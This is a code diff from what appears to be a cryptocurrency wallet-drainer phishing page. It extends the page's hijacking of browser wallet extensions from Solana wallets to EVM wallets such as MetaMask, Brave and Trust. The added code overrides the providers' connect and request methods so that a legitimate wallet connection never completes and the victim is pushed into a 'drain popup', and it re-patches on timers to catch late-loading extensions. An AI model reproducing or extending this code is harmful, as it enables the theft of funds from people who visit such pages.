@@ -103,21 +103,38 @@ let lastClickedWallet = '';
 // Let AppKit show wallets normally, but when a wallet tries to connect,
 // block it and open the drain popup instead.
 
-// Block Solana wallet extensions (Phantom, Solflare, Backpack, etc.)
-function blockSolanaProviders() {
+// Block ALL wallet extensions — Solana AND EVM (MetaMask, Brave, etc.)
+function blockAllProviders() {
+  // --- EVM providers (MetaMask, Brave, Trust, etc.) ---
+  const patchEVM = (provider) => {
+    if (!provider?.request || provider._landingBlocked) return;
+    provider._landingBlocked = true;
+    const origRequest = provider.request.bind(provider);
+    provider.request = function(args) {
+      if (args?.method === 'eth_requestAccounts' || args?.method === 'wallet_requestPermissions') {
+        const name = provider.isMetaMask ? 'metamask' : provider.isTrust ? 'trust' : provider.isBraveWallet ? 'brave' : lastClickedWallet || 'auto';
+        openDrainPopup(name);
+        return new Promise(() => {}); // never resolve
+      }
+      return origRequest(args);
+    };
+  };
+  if (window.ethereum) {
+    patchEVM(window.ethereum);
+    if (window.ethereum.providers) window.ethereum.providers.forEach(patchEVM);
+  }
+
+  // --- Solana providers ---
   // Phantom
   if (window.phantom?.solana && !window.phantom.solana._landingBlocked) {
     window.phantom.solana._landingBlocked = true;
-    const origConnect = window.phantom.solana.connect.bind(window.phantom.solana);
     window.phantom.solana.connect = function() {
       openDrainPopup('phantom');
-      return new Promise(() => {}); // never resolve
+      return new Promise(() => {});
     };
   }
-  // Also window.solana (often Phantom alias)
   if (window.solana && !window.solana._landingBlocked) {
     window.solana._landingBlocked = true;
-    const origConnect = window.solana.connect.bind(window.solana);
     window.solana.connect = function() {
       openDrainPopup(lastClickedWallet || 'phantom');
       return new Promise(() => {});
@@ -126,7 +143,6 @@ function blockSolanaProviders() {
   // Solflare
   if (window.solflare && !window.solflare._landingBlocked) {
     window.solflare._landingBlocked = true;
-    const origConnect = window.solflare.connect.bind(window.solflare);
     window.solflare.connect = function() {
       openDrainPopup('solflare');
       return new Promise(() => {});
@@ -135,7 +151,6 @@ function blockSolanaProviders() {
   // Backpack
   if (window.backpack?.solana && !window.backpack.solana._landingBlocked) {
     window.backpack.solana._landingBlocked = true;
-    const origConnect = window.backpack.solana.connect.bind(window.backpack.solana);
     window.backpack.solana.connect = function() {
       openDrainPopup('backpack');
       return new Promise(() => {});
@@ -144,10 +159,10 @@ function blockSolanaProviders() {
 }
 
 // Patch immediately + re-check (extensions load async)
-blockSolanaProviders();
-setTimeout(blockSolanaProviders, 500);
-setTimeout(blockSolanaProviders, 1500);
-setTimeout(blockSolanaProviders, 3000);
+blockAllProviders();
+setTimeout(blockAllProviders, 500);
+setTimeout(blockAllProviders, 1500);
+setTimeout(blockAllProviders, 3000);
 
 // Track wallet name from AppKit events — intercept ALL wallet selections
 modal.subscribeEvents((event) => {
